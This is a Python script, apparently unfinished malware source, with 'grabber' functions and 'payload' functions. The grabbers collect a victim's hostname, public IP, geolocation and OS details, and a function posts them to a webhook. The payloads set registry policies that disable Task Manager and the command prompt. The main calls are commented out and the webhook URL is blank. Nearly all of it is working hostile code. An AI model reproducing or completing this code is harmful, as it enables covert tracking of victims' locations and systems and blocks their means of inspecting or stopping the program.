class tracker:
    isAdmin = False
    dtmgr_succeed = False
    dcmd_succeed = False

def main():
    from datetime import datetime
    # embeds = [
    #     ip(),
    #     os(),
    # ]
    # tracker.isAdmin = isAdmin()
    # disable_taskmgr()
    # disable_cmd()
    # msgbox()
    # embeds.append({
    #     "title": "Payloads",
    #     "description": 
    #         f"Is admin: {tracker.isAdmin}\nDisabled task manager: {tracker.dtmgr_succeed}\nDisabled command prompt: {tracker.dcmd_succeed}",
    #     "footer": {"text": f"payloads@payload.snake | {datetime.now()}"}
    # })
    # send_webhook(embeds)

# Grabbers
def ip():
    import socket, requests, json, sys
    from datetime import datetime
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"}
    hostname = socket.gethostname()
    country = ""
    city = ""
    isp = ""
    zip_code = ""
    x = ""
    y = ""
    try:
        public_ip = requests.get("https://ipapi.co/ip", headers=headers).text
        try:
            ip_request = requests.get(f"http://ip-api.com/json/{public_ip}?fields=1098745")
            if ip_request.status_code == 200:
                ipdata = json.loads(ip_request.text)
                if ipdata["status"] == "success":country = ipdata["country"];city = ipdata["city"];zip_code = ipdata["zip"];x = ipdata["lon"];y = ipdata["lat"];isp = ipdata["isp"]
                elif ipdata["status"] == "fail": pass
            else:
                pass
        except:
            pass
    except requests.ConnectionError:
        return sys.exit()
    embed =  {
        "title": "IP Grabber",
        "description": 
                f"Host name: {hostname}\n"
                f"IP address: {public_ip}\n"
                f"Country: {country}\n"
                f"City: {city}\n"
                f"Zip: {zip_code}\n"
                f"ISP: {isp}\n"
                f"Longitude (X): {x}\n"
                f"Latitude (Y): {y}\n",
        "footer": {"text": f"ipaddr@grabber.snake | {datetime.now()}"}
    }
    return embed
def os():
    import platform
    from datetime import datetime
    embed = {
        "title": "OS Grabber",
        "description":
            f"Operating system: {platform.platform()}\n"
            f"Machine type: {platform.machine()}\n"
            f"Processor type: {platform.processor()}\n",
        "footer": {"text": f"os@grabber.snake | {datetime.now()}"}
    }
    return embed

# Payloads
def disable_taskmgr():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS), "DisableTaskMgr", None, winreg.REG_DWORD, 1)
        tracker.dtmgr_succeed = True
    else:
        tracker.dtmgr_succeed = False
        pass
def disable_cmd():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_ALL_ACCESS), "DisableCMD", None, winreg.REG_DWORD, 1)
        tracker.dcmd_succeed = True
    else:
        tracker.dcmd_succeed = False
        pass
# def msgbox():

def send_webhook(embeds):
    import requests
    data = {"username": "s.py", "embeds": embeds}
    requests.post(url="", json=data)

# Check if script is being run as administrator
def isAdmin():
    import os, ctypes
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin
if __name__ == '__main__': main()